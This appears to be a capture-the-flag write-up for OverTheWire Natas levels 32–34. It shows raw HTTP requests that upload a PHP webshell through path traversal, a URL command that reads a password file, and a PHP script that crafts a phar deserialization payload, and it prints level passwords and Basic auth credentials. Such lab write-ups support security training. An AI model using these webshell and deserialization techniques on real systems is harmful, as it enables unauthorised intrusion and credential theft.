Additional thoughts: the file `getpassword` has perms `-rwsrwx---` for user:group `root:natas32`, which means that the current user should be able to modify the executable and turn it into a privsec binary. However, I wasn’t able to execute any commands to mess it up. Not sure where the limitation is.

Password: `shoogeiGa2yee3de6Aex8uaXeech5eey`

## Natas 33

## A shortcut

**This is not the designed way to get the password**

The page `http://natas33.natas.labs.overthewire.org/index.pl`  has a hidden input  `filename`, which allows the file to be uploaded to any path (with traversal), as long as the folder is writable. From the last challenge we got RCE on the server, and was able to find that there exists a folder `/var/www/natas/natas33-new`  with is writable by current user  `natas33`. Thus, we can upload a PHP shell to this folder and get RCE, as follows.

| 1   2   3   4   5   6   7   8   9   10   11   12   13   14   15   16   17   18   19   20   21   22   23   24   25   26   27   28 | POST /index.php HTTP/1.1   Host: natas33.natas.labs.overthewire.org   Content-Length: 475   Cache-Control: max-age=0   Authorization: Basic bmF0YXMzMzpzaG9vZ2VpR2EyeWVlM2RlNkFleDh1YVhlZWNoNWVleQ==   Origin: http://natas33.natas.labs.overthewire.org   Content-Type: multipart/form-data; boundary=—-WebKitFormBoundaryrDg9m1cnIOTLcDtc   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3   Referer: http://natas33.natas.labs.overthewire.org/index.php   Accept-Encoding: gzip, deflate   Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja;q=0.6   Connection: close      ——WebKitFormBoundaryrDg9m1cnIOTLcDtc   Content-Disposition: form-data; name=”MAX\_FILE\_SIZE”      4096   ——WebKitFormBoundaryrDg9m1cnIOTLcDtc   Content-Disposition: form-data; name=”filename”      ../../var/www/natas/natas33-new/index.php   ——WebKitFormBoundaryrDg9m1cnIOTLcDtc   Content-Disposition: form-data; name=”uploadedfile”; filename=”abcd”   Content-Type: application/octet-stream         ——WebKitFormBoundaryrDg9m1cnIOTLcDtc– |
| --- | --- |

Use the uploaded webshell to get the password:

| 1 | http://natas33-new.natas.labs.overthewire.org/index.php?c=cat%20/etc/natas\_webpass/natas34 |
| --- | --- |

## The right way

From the source code, there is a `md5_file()` that directly takes the user input `filename`  as its parameter. It is vulnerable to PHP Object Injection as described in  [What is Phar Deserialization](https://blog.ripstech.com/2018/new-php-exploitation-technique/).

In brief, the function `md5_file()` with parameter like `'phar://[phar_file].phar'` will **deserialize**  the object inside  `Metadata`  of  `phar`  and invoke the functions `__destruct()` and `__wakeup()` for target classes. Moreover, the variables in the classes can also be changed to arbitrary value. A list of vulnerable functions can be found [here](https://www.ixiacom.com/company/blog/exploiting-php-phar-deserialization-vulnerabilities-part-1).

For this challenge, if we can craft a `phar`  file, upload it to the server and send its path to the  `md5_file()` function, we can trigger this bug and execute the `__destruct()` function under class `Executor`. In order to pass the  `if`  clause and get to the  `passthru()` function, we need to rewrite the `filename`  and  `signature`  varibles by injecting a PHP object of class  `Executor`. The following PHP code generates the crafted  `phar` file.

| 1   2   3   4   5   6   7   8   9   10   11   12   13   14   15 | $phar = new Phar(‘test.phar’);   $phar->startBuffering();   $phar->setStub(‘’); // Somehow required by PHP      class Executor{   private $filename=’shell.php’;   private $signature='\[MD5 for the shell.php\]’;   }   $object = new Executor();   $phar->setMetadata($object);   $phar->addFromString(‘test.txt’, ‘text’); // Somehow required by PHP   $phar->stopBuffering();      ?> |
| --- | --- |

*For the `test.txt`, simply create an empty file.*

The `shell.php` is the PHP file that executes our actual web shell. For example:

| 1   2 | echo file\_get\_contents(‘/etc/natas\_webpass/natas34’); |
| --- | --- |

Save the file and calculate its MD5 digest (`md5_file('shell.php')` works). Put the hash into the `signature`  variable and generate the  `test.phar`.

Now we have two files in hand – `shell.php`  and  `test.phar`. We need to upload these two files to the server and remember where they are. A good way is to intercept the POST request and modify the form-data  `filename`.

Suppose we have uploaded these two files with their initial names to the server, which will be put under `/natas33/upload/`. Now we need to trigger the `md5_file()` bug to inject PHP object, to run the `__destruct()` function which loads our special variables, to pass the `if`  clause and get to the  `passthru()` function:

| 1   2   3   4   5   6   7   8   9   10   11   12   13   14   15   16   17   18   19   20   21   22   23   24   25   26   27 | POST /index.php HTTP/1.1   Host: natas33.natas.labs.overthewire.org   Content-Length: 420   Cache-Control: max-age=0   Authorization: Basic bmF0YXMzMzpzaG9vZ2VpR2EyeWVlM2RlNkFleDh1YVhlZWNoNWVleQ==   Origin: http://natas33.natas.labs.overthewire.org   Content-Type: multipart/form-data; boundary=—-WebKitFormBoundaryLyBTS2TxqLDkk37I   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3   Accept-Encoding: gzip, deflate   Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja;q=0.6   Connection: close      ——WebKitFormBoundaryLyBTS2TxqLDkk37I   Content-Disposition: form-data; name=”MAX\_FILE\_SIZE”      4096   ——WebKitFormBoundaryLyBTS2TxqLDkk37I   Content-Disposition: form-data; name=”filename”      phar://test.phar   ——WebKitFormBoundaryLyBTS2TxqLDkk37I   Content-Disposition: form-data; name=”uploadedfile”; filename=”test.phar”   Content-Type: application/octet-stream      File content doesn’t matter here…   ——WebKitFormBoundaryLyBTS2TxqLDkk37I– |
| --- | --- |

From the HTTP response, we can see that the first `__destruct()` function fails to pass the `if`  clause since it’s the original object that the page created, but the second  `__destruct()` function invoked by our injected object succeeds, which actually calculates `if(md5_file('shell.php') == '[MD5 for shell.php]')` which is absolutely true. Then the `shell.php`  is passed to the  `passthru()` function, and we get the RCE!

Password: `shu5ouSu6eicielahhae0mohd4ui5uig`

## Natas 34

Displaying a placeholder page. For now this is the end.
